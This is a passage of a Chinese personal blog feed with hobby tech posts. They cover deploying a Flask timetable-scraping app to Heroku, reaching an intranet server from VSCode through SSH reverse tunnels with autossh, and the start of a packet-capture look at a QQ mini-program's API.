rel="noopener">这里</a>。  </p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/price.png" alt="price">  </p><p>Free版本的话，未认证用户每个月550小时免费动态时长，认证用户（好像是绑定银行卡）1000小时；30分钟无访问无活动的话会自己睡大觉，不会占用你的宝贵时长；提供二级域名，还可以自己绑米。  </p><p><strong>对于nuaaical来说，这个完全够用了呢！</strong>  </p><p>那就干脆折腾一下好了。  </p><p><br><br></p><h3 id="NUAA-iCal-Web端搭建"><a href="#NUAA-iCal-Web端搭建" class="headerlink" title="NUAA iCal Web端搭建"></a>NUAA iCal Web端搭建</h3><p>需要一个wsgi接口之类的嘛，flask、django这些现成的就行。</p><p>本来就啥也不知道也没玩过，看来一下flask挺简单的，于是就简单学了一下<strong>flask框架</strong>。</p><p>然而真正搭建的过程中遇到了一堆奇妙的bug，本地跑着好好的，上了heroku就炸了。（这个不细说了  </p><p>实际上代码就是从本地版本改的，毕竟在开发的时候留了很多现成的接口了，改一改调用一下函数之类的就完事了。</p><p>不过这个<strong>验证码</strong>折腾了老半天。</p><p>这里的策略是，当你访问页面的同时，后端去访问教务系统，把验证码图片爬下来送给前端，同时建立了一个与你有关的session。</p><p>当你post用户名密码及验证码后，后端利用同一个session去访问教务系统，<br>进而爬取课表及考试信息，<br>生成icalendar日历文件，<br>而后以附件下载的形式构造response，从而得到属于你的ical课表。  </p><br><p>当然，一定程度上安全一点，这个session在构造完response之后就销毁了，不保留在云平台上。</p><p>（这样其实还是没搞清楚验证码的机理，一定程度上相当于绕过了而已。</p><p>其实到这的话，本地搭建就结束了。</p><hr><p>不过还考虑了一下<strong>复杂的生产环境</strong>……  </p><ul><li><p>比如说<strong>登录信息重复post</strong>，而原来的验证码就不再有效了。</p><p>这里其实想了几种方案，但是行不通。最后干脆折腾了一波HTML，加了个前端界面，如果没登陆成功就提示一下，然后过一会儿返回主页好了。233</p><p><strong>（有更好的方案欢迎提出喵！</strong></p></li><li><p>比如<strong>未登录情况下直接访问导出ical的页面</strong>  </p><p>这个也是直接返回主页了。不过这里这个判断折腾了老半天。</p><p>最后的方案是在flask的session里建立了一个属于当前session的bool变量，默认为False，登录以后设置为True。</p><blockquote><p>之前直接写在程序的全局变量里，本地跑着好好的，上云平台就炸了……再见。   </p><p>还写过在flask的g变量里，后来仔细查了资料，g变量好像是只在当前页面请求中有效，意思就是作用范围不一样，于是否决了。</p></blockquote></li><li><p>教务系统<strong>连接已重置</strong></p><p>这个是他教务系统的问题啊，难顶了。还是折腾了老半天才发现这里的问题。  </p><p>又改了改登录的延时，这回变成随机延时了，而且时间也加长了。  </p><p>而且还把爬虫的UA改成了当前浏览器的UA。IP的话好像没办法了。   </p><p>问题有所改善…然而偶尔还存在。</p><p><strong>大不了多试几次就好了。</strong></p></li><li><p>etc.</p></li></ul><blockquote><p>其实还有个打算是做个前端ifram框架之类的直接嵌套官方的登录界面，然后登录成功后再利用登录信息来爬取课表，这样一定程度上可能还更安全一点。<br>再说吧……</p></blockquote><br><hr><br><h3 id="Heroku搭建"><a href="#Heroku搭建" class="headerlink" title="Heroku搭建"></a>Heroku搭建</h3><p>下面来简单记录一下Heroku的部署。</p><ol><li><p><strong>注册一个账号</strong></p><p>网址<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.heroku.com%2F" target="_blank" rel="noopener">https://www.heroku.com/</a></p><p>略。建议用gmail，不过也看到用国内邮箱也成功的。  </p></li></ol><ol start="2"><li><p><strong>安装Heroku CLI 命令行接口</strong></p><p>Win-x64：<a href="https://cli-assets.heroku.com/heroku-x64.exe" target="_blank" rel="noopener">下载地址</a></p><p>其他环境的见官网好了。<a href="https://devcenter.heroku.com/articles/heroku-cli" target="_blank" rel="noopener">https://devcenter.heroku.com/articles/heroku-cli</a></p><p>安装完之后就可以在命令行用<code>heroku</code>命令了。</p></li></ol><ol start="3"><li><p><strong>登录</strong></p><pre class=" language-bash"><code class="language-bash">heroku login</code></pre><p>会弹出网页登录验证，或者在命令行登录。</p></li></ol><ol start="4"><li><p><strong>准备好app</strong></p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/image-20191229023615517.png" alt="支持的app"></p><p>你看他支持的语言挺多的呢。</p><p>我这里用到的就是python啦。</p><p>这个在上一节已经搭建好了喵。</p></li></ol><ol start="5"><li><p><strong>创建app</strong></p><pre class=" language-bash"><code class="language-bash">heroku create</code></pre><p>这时候同时建立了一个名为<code>heroku</code>的git remote仓库，连接到了你本地的git仓库。</p><p>当然也可以现在网站上创建一个应用，再clone</p><pre class=" language-bash"><code class="language-bash">heroku git:clone -a nuaaical<span class="token function">cd</span> nuaaical</code></pre><p>这里前提是建立好了名为<code>nuaaical</code>的应用了。</p></li><li><p><strong>建立依赖相关的<code>requirements.txt</code></strong></p><p>略。</p></li></ol><ol start="7"><li><p><strong>指定执行的入口</strong></p><p><strong>这里算是一个坑吧，折腾了好久才发现。</strong></p><p>你必须先在代码目录下建立一个名为<code>Procfile</code>的文件，在里面写上你要他执行的命令。比如执行一个python文件之类的。</p><p>在这里用的是<code>gunicorn</code>来建立一个web应用。（flask只用于本地测试使用</p><pre><code>web: gunicorn web:app</code></pre><p>第二个<code>web</code>是文件名（<code>web.py</code>），<code>app</code>是flask实例化的对象啦。<br>（代码里写的<code>app = Flask(__name__)</code>  </p></li></ol><ol start="8"><li><p><strong>指定用构建语言（可略？）</strong></p><pre class=" language-bash"><code class="language-bash">heroku buildpacks:set heroku/python</code></pre><p>显示指定用python来构建打包（网上有的说不指定会报错？</p></li></ol><ol start="9"><li><p><strong>部署代码</strong></p><p>终于可以部署了呀！直接push好了。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> push heroku master</code></pre><p>如果不行的话加上<code>-f</code>强制push<strong>（小心一点）</strong>。</p><p>然后可以看到部署的日志，如果有问题就再看看。</p><p>没问题的话，效果类似下面的。</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/push.png" alt="push"></p></li></ol><ol start="10"><li><p><strong>看看你的网站吧</strong></p><pre class=" language-bash"><code class="language-bash">heroku <span class="token function">open</span></code></pre><p>然后会调用你的浏览器打开。</p><p>或者自己在浏览器访问就好了。</p></li></ol><p><strong>嘻嘻嘻，到这就结束啦~</strong></p><p><br><br></p><h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><p>当然还有一些<strong>常用命令</strong>，比如：</p><ul><li><p>查看日志<strong>(debug必备了)</strong></p><pre class=" language-bash"><code class="language-bash">heroku logs --tail</code></pre></li><li><p>看一下还有多少剩余时长</p><pre class=" language-bash"><code class="language-bash">heroku <span class="token function">ps</span></code></pre></li><li><p>打开app服务</p><pre class=" language-bash"><code class="language-bash">heroku ps:scale web<span class="token operator">=</span>1</code></pre></li><li><p>关闭app服务</p><pre class=" language-bash"><code class="language-bash">heroku ps:scale web<span class="token operator">=</span>0</code></pre></li><li><p>etc.</p></li></ul><blockquote><p>官方文档<code>Getting Started on Heroku</code>看这里 <a href="https://devcenter.heroku.com/start" target="_blank" rel="noopener">https://devcenter.heroku.com/start</a></p></blockquote><p><br><br></p><p>除此以外，Heroku还支持<code>pipeline</code>，还可以授权从GitHub上同步部署，还有容器啥的……</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/image-20191229033131933.png" alt=""></p><p>感觉还是挺不错的呢！  </p><p><br><br></p><hr><h2 id="Achievements"><a href="#Achievements" class="headerlink" title="Achievements"></a>Achievements</h2><p>部署好的web端网址：</p><p><a href="https://nuaaical.herokuapp.com/" target="_blank" rel="noopener">https://nuaaical.herokuapp.com/</a></p><p><strong>欢迎来试试呀！</strong></p><p>第一次访问可能会花一些时间，等一等吧。</p><p>如果不成功的话刷新一下页面（但不要重复提交登录信息），或重新开一个页面访问。</p><p>同时多人访问的话也可能会有问题（没试过），那就再试试吧。（摊手</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/frontend.png" alt="前端"></p><blockquote><p>好了我知道这个页面丑了。现学的HTML，别说了。</p><p>其实之前奶冰奶冰奶冰冰做了一个前端的↓ </p><p>后面再折腾吧咕咕咕</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/frontend_vue.png" alt="vue.js前端"></p><p><strong>欢迎来贡献代码呀！</strong></p></blockquote><blockquote><p>其实之前还折腾了老半天，尝试了<strong>在Azure上部署</strong>，也成功了。</p><p>需要在VSCode中进行部署，然后在配置里设好启动命令（也可以是一个文件）。</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/Azure_deploy.png" alt="Azure_deploy"></p><p>不过现在Azure服务到期了。部署的网站也停止了呢。</p><p>截个图纪念一下吧。</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/Azure_website.png" alt="Azure_website"></p><p>（hackathon的时候白嫖的Azure还是挺爽的233  </p></blockquote><p>同时，<strong>代码开源在GitHub上了。欢迎来点个star，提个PR喵！</strong>   </p><p><a href="https://github.com/miaotony/NUAA_iCal_Web" target="_blank" rel="noopener">https://github.com/miaotony/NUAA_iCal_Web</a></p><p><br><br></p><p><strong><em>仅供学习研究，未经允许禁止商用，谢谢。</em></strong></p><p>文章中不免存在问题，欢迎提出。  </p><br><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li><a href="https://devcenter.heroku.com/" target="_blank" rel="noopener">https://devcenter.heroku.com/</a></li><li><a href="https://www.jianshu.com/p/191248ad2639" target="_blank" rel="noopener">https://www.jianshu.com/p/191248ad2639</a></li></ol><p><br><br></p><blockquote><p>浪够了，继续准备考试。（真难顶……</p><p>期末冲冲冲！</p><p>说不定这是今年最后一篇blog了喵。</p><p>溜了溜了。</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> Web </tag>
            
            <tag> iCal </tag>
            
            <tag> Heroku </tag>
            
            <tag> Deployment </tag>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 基于VSCode和ssh实现远程编程/炼丹</title>
      <link href="/2019/12/21/Idea_RemoteProgramming/"/>
      <url>/2019/12/21/Idea_RemoteProgramming/</url>
      
        <content type="html"><![CDATA[<h2 id="Cause"><a href="#Cause" class="headerlink" title="Cause"></a>Cause</h2><p>在内网有一台服务器，能连接外网但由于没有公网 IP 而无法在外网直接访问，之前想要在上面跑程序的时候，就得通过远程桌面进行操作。虽然 <code>Teamviewer</code> 速度还可以，但总感觉有点不太爽……  </p><p>很久以前（大概一两个月前）就在逼乎上看到过一篇文章说可以</p><blockquote><p><strong>使用vscode进行远程炼丹</strong>  <em>（原文见 Reference #1</em></p></blockquote><p>噫！我来兴趣了，而且其实早就想试试了，然而之前在忙别的没空折腾<del>（其实现在也没空）</del>，就是前几天在配服务器环境的时候<del>（麻烦到爆炸，最讨厌配环境了）</del>，一想干脆就再折腾一下，弄好远程炼丹（编程）吧。  </p><p>于是乎就这样连Linux命令都不知道几个的憨憨瞎折腾了一两天的ssh，终于实现了远程炼丹，<strong>贼有成就感嘻嘻嘻</strong>。</p><p>其中遇到了一些奇怪的问题，简单记录一下，也方便我忘了再回来看看吧。</p><p>时间有限，VSCode的部分就大概提一下思路，<strong>重点是<code>ssh</code>的部分</strong>吧……   </p><h2 id="Guidance-for-ssh"><a href="#Guidance-for-ssh" class="headerlink" title="Guidance for ssh"></a>Guidance for ssh</h2><p>不妨假设如下，<strong>记清楚了噢，后面频繁用到的</strong>。</p><table><thead><tr><th>computer</th><th>IP/address</th><th>info</th></tr></thead><tbody><tr><td>内网服务器A</td><td>172.x.x.x</td><td>可以访问外网，但外网不能直接访问A</td></tr><tr><td>公网服务器B</td><td>test.com</td><td>可以访问外网，也可被外网访问</td></tr><tr><td>能够联网的主机C</td><td>-</td><td>想要在C上对A进行访问</td></tr></tbody></table><h3 id="内网服务器A上的设置"><a href="#内网服务器A上的设置" class="headerlink" title="内网服务器A上的设置"></a>内网服务器A上的设置</h3><p>A设置反向代理到B的 port1 端口  </p><blockquote><p>工作原理：<br>1、本地主机和远程主机建立连接；<br>2、远程主机上分配了一个 socket 侦听 port 端口；<br>3、远程端口上有了连接, 该连接就经过安全通道转向本机的端口。   </p><p>备注：root 登录远程主机才能转发特权端口。</p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> -fCNR <span class="token operator">&lt;</span>port1<span class="token operator">></span>:localhost:22 usr_b@test.com -p 22</code></pre><blockquote><p>-R port1:host:port2 将远程机器的端口映射到本地。port1是公网服务器B的端口，host为本地A的IP，port2是A要映射到公网的端口。<br><code>usr_b@test.com</code> 用户名@服务器B地址，表示连接到B，以用户<code>usr_b</code>登录。当然<code>test.com</code>也可以是IP地址啦。<br>-f SSH客户端在后台运行<br>-C 允许压缩<br>-g 允许远程主机可远程访问，这里有坑。  （但<code>autossh</code>没有这个选项所以应该影响不大）<br>-N Do not execute a shell or command. 不执行脚本或命令，通常与-f连用。<br>-p 22 表示指定连接到B的22端口，默认就是22啦，如果不是的话设置成B的ssh端口。   </p></blockquote><p>注意一下，<em>（网上说）</em>这里有个坑，-g还需要在公网服务器B做下面的设置，设置完后再重启服务。</p><pre class=" language-bash"><code class="language-bash">＃vim /etc/ssh/sshd_config 新增GatewayPorts <span class="token function">yes</span></code></pre><hr><h4 id="进阶1-autossh"><a href="#进阶1-autossh" class="headerlink" title="进阶1  autossh"></a><strong>进阶1  autossh</strong></h4><p>由于ssh会自动断开连接，于是<strong>利用自动重连工具<code>autossh</code>，保证连接稳定</strong>。</p><p>首先安装autossh，这里我用的是CentOS系统。其他类似的。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> yum -y <span class="token function">install</span> autossh</code></pre><blockquote><p>其实我发现yum（的源里）找不到autossh，后来是用wget下载然后手动安装的…</p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token function">screen</span> -S reverse_proxyautossh -M <span class="token operator">&lt;</span>port2<span class="token operator">></span> -CNR <span class="token operator">&lt;</span>port1<span class="token operator">></span>:localhost:22 usr_b@test.com</code></pre><p>多了个-M参数，表示从B的port2检测是否断线。同时autossh会在后台运行，-f也不需要了。  </p><p>这里的screen用于命令行终端切换，给这个界面起了个名叫<code>reverse_proxy</code>，当然没有装screen的话也需要装一下，不过不执行screen这条语句理论上也能用。</p><p><strong>注意，port1和port2均需要在B的安全组内设好规则，允许外网访问。</strong>  </p><p>而后看一下有没有运行↓</p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220021730475.png" alt="看一下进程"></p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220022409722.png" alt="netstat看一下"></p><p>可见A已和B建立连接。<br>此处port1为9999，port2为9998，仅用于演示，你完全可以看心情选择你喜欢的端口，当然有的端口有特定功能另外说。  </p><hr><h4 id="进阶2-开机自启"><a href="#进阶2-开机自启" class="headerlink" title="进阶2  开机自启"></a><strong>进阶2  开机自启</strong></h4><p>当然，为了连接再可靠一点，确保A重启后还可以连上，可以在A上再设置一下<strong>开机自动启动autossh</strong>。</p><p>有一种方法是在<code>/etc/rc.local</code>里面添加如下内容</p><pre class=" language-bash"><code class="language-bash"><span class="token function">su</span> - user_a -c <span class="token string">"autossh -i /home/user_a/.ssh/id_rsa -o BatchMode=yes -M &lt;port2> -CNR &lt;port1>:localhost:22 usr_b@test.com"</span></code></pre><p>其中，<code>-i</code>后接的是SSH_KEY_FILE_PATH，即私钥地址，root用户默认为<code>/root/.ssh/id_rsa</code>。<br><code>user_a</code>是A上的用户，且要求在公网服务器B上，已经有了A主机上用户user_a的公钥<em>（这个在下面B的设置中介绍）</em>。</p><p>然后记得给这个文件赋予<strong>可执行</strong>权限。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">chmod</span> +x /etc/rc.d/rc.local</code></pre><p>不过看这个文件注释里的说法，好像这个方法不推荐了。  </p><p>当然<strong>还可以使用其他的配置开机自启的方法</strong>，我也刚折腾对Linux也不熟，后面再看看吧。  </p><p>现在你可以<code>reboot</code>试一下了，前提是你能确保用这台服务器的其他人没意见，重要数据记得保存好噢。   </p><p>这样A上的设置就告一段落了，下面看公网服务器B。  </p><hr><h3 id="公网服务器B上的设置"><a href="#公网服务器B上的设置" class="headerlink" title="公网服务器B上的设置"></a>公网服务器B上的设置</h3><p>如果只需要在B上对A进行远程炼丹，那就不需要在B上设置啥了，现在<strong>直接ssh就完事了</strong>。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> -p <span class="token operator">&lt;</span>port1<span class="token operator">></span> localhost</code></pre><p>因为已经把A的ssh对应的22端口映射到B的port1端口了呀！  </p><p>试一下果然如此。  </p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220023008851.png" alt="在B上ssh连接A"></p><h4 id="进阶-免密登录"><a href="#进阶-免密登录" class="headerlink" title="进阶  免密登录"></a>进阶  免密登录</h4><p>这样每次登录都需要输入密码，是有点麻烦了。</p><p>这有个办法，就是把本机的ssh公钥复制到要登录的服务器A的<code>~/.ssh/authorized_key</code>文件中，实现免密登录。</p><p>什么，你还觉得太麻烦了？？？</p><p>这里还有一个快办法，就是在B上登录A后执行这个——</p><pre class=" language-bash"><code class="language-bash">ssh-copy-id -i .ssh/id_rsa.pub  usr_a@172.x.x.x</code></pre><blockquote><p>-i 指向本地的公钥文件，一般在用户的目录下。<br><code>usr_a</code> 为A上要登录的用户名</p></blockquote><p>然后就可以从B免密登录内网服务器A啦。你现在可以在B上ssh试一下，理论上直接就已经登录好了呢！  </p><hr><h3 id="在任意一台联网主机C对A进行访问的实现"><a href="#在任意一台联网主机C对A进行访问的实现" class="headerlink" title="在任意一台联网主机C对A进行访问的实现"></a>在任意一台联网主机C对A进行访问的实现</h3><p>到这里我有点成就感了，<strong>远程炼丹实际上已经实现了</strong>。  </p><p>然而我的初衷是要<strong>在一台能联网的主机C上去连接内网A</strong>的呀，不行还得再折腾一下啊呜。  </p><p>首先试了一下直接连接公网服务器B的port1，然而不可行。  </p><p>不过网上有些资料说是可行的，这个我也不知道呢，可能要问神奇的海螺吧。   </p><blockquote><p>根据网上的说法，已经在B上对<code>GatewayPorts</code>进行了设置，也杀死进程重启了服务甚至直接<code>reboot</code>了，然而不知道为啥不可行……</p></blockquote><p>不过也不是没有办法呢，ssh里还有个<strong>正向代理</strong>闲着没事干呢，说上就上吧。  </p><p>在B上继续进行如下配置</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> -fCNL  *:<span class="token operator">&lt;</span>port3<span class="token operator">></span>:localhost:<span class="token operator">&lt;</span>port1<span class="token operator">></span> localhost</code></pre><p>表示将B上的port1映射到port3，注意<strong>port3也要设置安全组规则</strong>啊。  </p><p>用<code>ss -ant</code> 看了一下，port3的确打开了。  </p><p>理论上这样的话在C上ssh连接B的port3端口，就可以直接访问到内网A了的。</p><p>如果你成功了，那就可以<strong>直接跳到配置VSCode的部分</strong>了，<strong>尽情享受远程炼丹的快感吧！</strong>  </p><p><strong>喜欢的话可以滑到页面下方，赞赏一下给我买点好吃的<em>（我饿了.jpg</em></strong>    </p><hr><p><strong>然而我并没有成功……</strong>  </p><p>看了一下安全组设置，没问题，唉，大不了全开了嘛。还是不行。  </p><p>这里我难受死了，杀死进程又重来试了好几次，一样没有效果。  </p><p>再去网上查了查，直到看到一篇文章里提到了这个问题，但他直接用的ssh而没有用到autossh，用他的方案还是没解决问题。不过里面提到了一个命令叫<code>lsof</code>，即“列出打开文件(lists openfiles)”，而在Unix中一切（包括网络套接口）都是文件。<strong>这可是个神器啊！</strong>  </p><p>这里用到的是     </p><blockquote><p>使用<code>-i :port</code>来显示与指定端口相关的网络信息。  </p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token function">lsof</span> -i :<span class="token operator">&lt;</span>port3<span class="token operator">></span>  <span class="token comment" spellcheck="true"># 查看连接port3端口的网络信息</span></code></pre><p>结果类似于这样（忘记截图了），此处port3为仅供演示所用的9988。</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># lsof -i :9988</span>COMMAND PID USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME<span class="token function">ssh</span>     658 root    4u  IPv6  146251      0t0  TCP *:9988 <span class="token punctuation">(</span>LISTEN<span class="token punctuation">)</span></code></pre><p>这里我才发现，噫，怎么只监听了IPv6，而没有IPv4啊！</p><p>实际上通过<code>ss -ant</code>也可以发现对应的端口只有tcp6而没有tcp…  </p><p>然而阿里云实例（安全组内）只有IPv4出口来着，而且也是通过IPv4连接到B的，怪不得连不上呢。（佛了  </p><p>不过也奇怪了，理论上ssh应该v4和v6都监听的吧。  </p><p>去查了一下ssh命令，这次<strong>强制使用 IPv4</strong>试试。  </p><p>（在B上杀死之前的ssh，再执行下面的命令。记得改成你的端口哈。  </p><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> -fCNL  *:<span class="token operator">&lt;</span>port3<span class="token operator">></span>:localhost:<span class="token operator">&lt;</span>port1<span class="token operator">></span> localhost -4</code></pre><blockquote><p><code>-4</code>表示强制使用IPv4</p></blockquote><p>这回再看<code>lsof -i :&lt;port3&gt;</code>：  </p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># lsof -i :9988</span>COMMAND PID USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME<span class="token function">ssh</span>     954 root    4u  IPv4  255331      0t0  TCP *:9988 <span class="token punctuation">(</span>LISTEN<span class="token punctuation">)</span></code></pre><p>然后再在C上连接B的port3端口。</p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220021132045.png" alt="通过外网成功连上内网服务器"></p><p>哇哇哇成功了！  </p><p>看来果然是这个问题啊我哭了又笑了。  </p><p>下面就可以设置VSCode来实现远程炼丹啦！  </p><h2 id="Guidance-for-VSCode"><a href="#Guidance-for-VSCode" class="headerlink" title="Guidance for VSCode"></a>Guidance for VSCode</h2><p>具体可以参考<em>Reference #1</em>，这里简单操作一下。  </p><p>在VSCode安装<strong><code>Remote Development</code>开发包（扩展）</strong>，然后在远程资源管理器里新增一个SSH Target。  </p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220011642994.png" alt="VSCode_ssh配置"></p><p>在用户的<code>.ssh/config</code>文件内新增你的内网炼丹炉信息。</p><blockquote><p>Host 给你的内网主机起个名（看你心情随意取）<br>HostName  公网服务器B的IP或域名<br>Port 填port3，如果port1能连上就填port1<br>User 填内网服务器A的登录用户名    </p></blockquote><p>保存，然后便可以连接试一试了。  </p><p>连接后输入A对应用户的密码，然后就连上了。打开文件夹还需要再输一次密码。   </p><p>现在再用前面在B的配置里说的办法，把C主机的公钥放到A里就可以实现免密登录啦！   </p><p>呐，这就是在C上连接到内网炼丹炉的效果了↓。</p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220011440883.png" alt="VSCode远程炼丹效果"></p><p>网络延时几乎没有<em>（不过也取决于网络环境）</em>，和在本地编程几乎没有差别，爽到爆炸！  </p><p>哇哇哇成就感爆棚啊哇哇哇！！！</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>时间因素，不可避免可能存在一些失误之处，其中也有不少可以拓展之处，欢迎交流提出哈。  </p><p>本文<strong>仅用于学习研究，请在合理合法范围内使用</strong>，</p><p><strong>未经允许不得商用，转载请署名MiaoTony并保留本文链接</strong>，谢谢。</p><p>说点题外话吧。  </p><blockquote><p>上周末到这周部署<a href="https://github.com/miaotony/NUAA_iCal_Web" target="_blank" rel="noopener"><code>NUAA_iCal_Web</code>在线版本</a>弄了一周末（好菜啊第一次弄部署来着…），配服务器环境折腾了老半天（甚至只装好了GPU驱动和anaconda还没配CUDA），配远程炼丹又瞎折腾了一两天，写这篇文章又断断续续地花了好几个小时。  </p></blockquote><p>呜下周开始频繁考试了，不敢瞎折腾了嘤嘤嘤。（溜了溜了   </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li><a href="https://zhuanlan.zhihu.com/p/89662757" target="_blank" rel="noopener">使用vscode进行远程炼丹</a> </li><li><a href="https://www.cnblogs.com/zhongbin/p/3940956.html" target="_blank" rel="noopener">SSH反向连接使用Autossh自动ssh</a>  </li><li><a href="https://www.jianshu.com/p/3cd2793ba719" target="_blank" rel="noopener">利用阿里云ECS跳板机内网穿透- ssh</a> </li><li><a href="https://www.centos.bz/2017/08/ssh-reverse-proxy/" target="_blank" rel="noopener">SSH如何反向代理稳定穿透内网</a></li><li><a href="https://zhuanlan.zhihu.com/p/57477087" target="_blank" rel="noopener">内网穿透：在公网访问你家的 NAS</a>   （还包括<code>frp</code>相关）</li><li><a href="https://www.jianshu.com/p/85866b87c7d0" target="_blank" rel="noopener">从外网 SSH 进局域网，反向代理+正向代理</a></li><li><a href="https://www.jianshu.com/p/7accc1e485d3" target="_blank" rel="noopener">autossh 穿透，反向代理到内网</a></li><li><a href="https://blog.csdn.net/liu_qingbo/article/details/78383892" target="_blank" rel="noopener">ssh-copy-id三步实现SSH无密码登录和ssh常用命令</a></li><li><a href="https://www.jianshu.com/p/a3aa6b01b2e1" target="_blank" rel="noopener">Linux 命令神器：lsof</a></li><li><a href="https://www.oschina.net/translate/automatically-restart-ssh-sessions-and-tunnels-using-autossh" target="_blank" rel="noopener">使用 autossh 自动重启 SSH 会话和通道</a></li><li><a href="https://www.fcwys.cc/archives/371.html" target="_blank" rel="noopener">CentOS7添加开机启动服务或脚本</a></li></ol><p>etc.   </p><p>非常感谢上面这些文章，给了我很多启发呢。  </p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> Server </tag>
            
            <tag> ssh </tag>
            
            <tag> VSCode </tag>
            
            <tag> 远程 </tag>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | QQ小程序【年终报告单/2019年终总结】分析</title>
      <link href="/2019/12/04/Scrapy_2019Year-end_Report/"/>
      <url>/2019/12/04/Scrapy_2019Year-end_Report/</url>
      
        <content type="html"><![CDATA[<h2 id="缘由"><a href="#缘由" class="headerlink" title="缘由"></a>缘由</h2><p>这两天看空间各种发【我的2019年终报告】，然后我也去测了一下，没想到啥也不用填，申请获取个人信息的权限，报告就出来了。  </p><p>然而弹出一个遮罩层让你先看个15s的广告……  </p><p>超想吐槽，包括页面下面的广告。。  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/movie.png" alt="movie"></p><p>然后看完广告，终于出来了。  </p><p>正当我截了图返回之后，噫换个性别试试。  </p><p>好，这回不一样了呀！  </p><p>然后再来一次，噫，又不一样了……这让我怀疑他就是假的几张图片而已吧。  </p><p>我兴趣来了，不如来折腾一下，分析一下这个小程序吧。  </p><p>（不折腾会死……</p><h2 id="开始折腾"><a href="#开始折腾" class="headerlink" title="开始折腾"></a>开始折腾</h2> <a id="more"></a> <h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>先来看一看这个小程序的设置，发现只获取了<strong>用户信息</strong>。看一眼<strong>更多资料</strong>——  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image1.png" alt="image1"></p><p>先确定了这是个个人开发的小程序，看相关的域名除了Tencent家的，主要就是<code>wxa.game-a1.cn</code> 和<code>free-api.heweather.com</code>。  </p><p>查了一下，后者是一个查天气的API（需要的话可以用一波）<em>（就是很迷惑为啥这里会有这个</em>  </p><p>前者是一个个人的域名吧，看样子是用的一个开发小程序的平台。根域名还是个博客，里面还有搭建微信小程序的经历。</p><hr><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>ping了一下这个域名，得到IP：<code>47.105.42.112</code>  </p><p>然后抓了个包，过滤只看关于这个IP的数据包。发现有两个。  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/Inked.jpg" alt="Inked"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image2.png" alt="2"></p><p>前面一个不懂什么鬼填了个表，估计收集了一波使用数据，先不管。重点是后面这个。</p><p>很明显是访问了<code>http://wxa.game-a1.cn/wxa/qqnz2019/index.php</code>这个网址。</p><hr><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>浏览器启动，F12大法好呀。  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image3.png" alt="image-20191204143118444"></p><p>好一个JSON字符串，来分析一下吧。  </p><p><code>qrcode</code>很明显是二维码啦，下载下来解码发现调用了qq小程序的接口吧，访问会跳转到这个小程序。</p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image4.png" alt="image-20191204143437363"></p><p><code>url</code>和<code>url1</code>都是一样的，指向了一个阿里云的对象存储。↓</p><p><a href="https://oos-pic.oss-cn-beijing.aliyuncs.com/2019%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/1.png" target="_blank" 